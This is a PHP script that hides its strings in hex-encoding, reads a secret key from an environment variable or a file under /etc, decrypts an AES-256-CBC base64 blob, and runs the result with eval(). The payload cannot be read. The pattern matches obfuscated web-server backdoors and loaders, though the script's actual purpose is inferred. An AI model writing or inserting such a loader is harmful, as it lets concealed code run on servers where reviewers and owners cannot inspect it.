<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+JvGdjC+nCLgBV9yJ+QXpg==');

$c=base64_decode(

'Pp1r39oM6VY23NbWf92t8s5+yRiMl492CZyqsY5LzQQm05xX9C1Xs6stKTr12+WqaLTpEjfb+TZu' .
'2UfSwPBGVoufWBD5E+UINiSccvPFM/OIE8D1ZICh16RmkSpJMF74OI7Ch0WOu9znm4Ly5ZZnbfcJ' .
'cAxZhTpF8kwsmpYQCke07Kntx1UHs4bDImOVgsmiUXUOvBhVtnn7xM6cHj0ixREzAlTcpA//KEei' .
'+4b3u3e7fYLP4xr3B9ktXekPlXH7BmiFDwp/3shnI+psYgzOppIKrIHhJvdSmRCZ5TmyrLGeaBx+' .
'sh/6fnVUXLQuODKYPwM138SDh09s0ZkWQsp31BPMvhVt3sJN0l/hFQ6RTEUJkKc0cfczfHQ+ujs9' .
'7YKGily7UGFmSrjadNbmFBZCJ9Bt1sapoRSvOQH7o0HO79nD/SDlzWrSnE/Rijv7nUyOzxPARxL2' .
'18/ZJztRrX+s9XChoOcWKMhkPnGtdxAHbJ6NnUBVYflatOf1R6Ewq/qsaT61dU5hUtxcrJD+l//d' .
'izJniLq3bqpFeTDOexo8T5pOe+Yc7lbA+ZCCXVyoay1vYsTVw9MckJndr7nMcBLcJEVlIlKOEzPX' .
'TQyXBCn836/WQNn2GKBpnSO7bfk9F87lkUi3YiY7F/3iPz7cD6sSzJ7d+6bnZg4p/jLVRL9mD+9N' .
'2fnuwjAqaQ9fh2rvnbNINq35FqJKhofCEQiNsvUNuQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

